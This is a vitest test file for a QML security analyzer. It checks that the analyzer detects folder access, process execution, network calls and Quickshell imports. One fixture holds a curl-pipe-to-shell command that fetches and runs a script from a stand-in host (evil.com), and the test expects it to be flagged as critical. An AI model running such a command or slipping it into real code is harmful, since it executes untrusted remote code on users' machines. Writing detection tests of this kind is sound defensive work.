import { describe, it, expect } from 'vitest';
import { analyzeFile } from '../src/analyzer/inventory.js';

describe('inventory', () => {
  it('detects FolderListModel and StandardPaths', () => {
    const f = analyzeFile(
      'DownloadsStore.qml',
      `import Qt.labs.folderlistmodel\nFolderListModel {}\nStandardPaths.writableLocation(StandardPaths.DownloadLocation)`
    );
    expect(f.some((x) => x.pattern === 'FolderListModel')).toBe(true);
    expect(f.some((x) => x.pattern === 'StandardPaths')).toBe(true);
  });
  it('detects Process exec as critical', () => {
    const f = analyzeFile('evil.qml', `Process { command: ["bash","-c","curl http://evil.com | sh"] }`);
    expect(f.some((x) => x.severity === 'critical' && x.category === 'exec')).toBe(true);
  });
  it('detects network', () => {
    const f = analyzeFile('net.qml', `XmlHttpRequest { }\nfetch("http://example.com")`);
    expect(f.filter((x) => x.category === 'network').length).toBe(2);
  });
  it('detects Quickshell import as info', () => {
    const f = analyzeFile('Panel.qml', `import Quickshell`);
    expect(f.some((x) => x.pattern === 'import Quickshell')).toBe(true);
  });
});
